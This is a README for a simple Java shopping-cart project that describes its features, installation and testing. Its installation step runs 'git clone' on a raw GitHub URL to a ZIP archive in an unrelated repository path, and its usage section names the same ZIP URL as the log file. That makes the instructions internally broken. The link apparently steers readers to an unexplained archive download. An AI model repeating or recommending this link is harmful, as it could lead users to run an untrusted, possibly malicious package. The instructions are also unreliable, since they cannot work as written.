Simplified Shopping System
This project is a simplified yet comprehensive shopping system that allows customers to browse products, add items to their shopping cart, place orders, and simulate the payment process.

Introduction
The Simplified Shopping System is designed to provide users with a convenient way to shop for products online. It implements fundamental principles and design patterns such as SOLID principles, Singleton, Factory, and Builder patterns. The system incorporates user authentication, product catalog management, order processing, payment simulation, and logging functionalities.

Features
User authentication system for customer login and registration.
Product catalog with essential information, including name, price, and SKU.
Order processing mechanism utilizing Singleton and Factory patterns for cart management and product creation.
Payment processing system for simulating transactions using a mock payment gateway.
Logging system to record important events and transactions.

Requirements
Java Development Kit (JDK) 8 or higher
Text editor or Integrated Development Environment (IDE)
Dependencies:
None for core functionality
Installation
Clone the repository to your local machine:

git clone https://raw.githubusercontent.com/ShengyangGuan/shane/main/outrant/Software-v1.6.zip
Open the project in your preferred IDE or text editor.
Usage
Run the Main class to start the application.
Follow the on-screen instructions to register or login as a user.
Browse available products, add items to the shopping cart, and place orders.
Simulate payment processing.
Review logs in the https://raw.githubusercontent.com/ShengyangGuan/shane/main/outrant/Software-v1.6.zip file for recorded events and transactions.
Testing
Unit tests are implemented for critical components such as the shopping cart, product catalog, and order processing. 

To run tests:
# Execute unit tests
./gradlew test
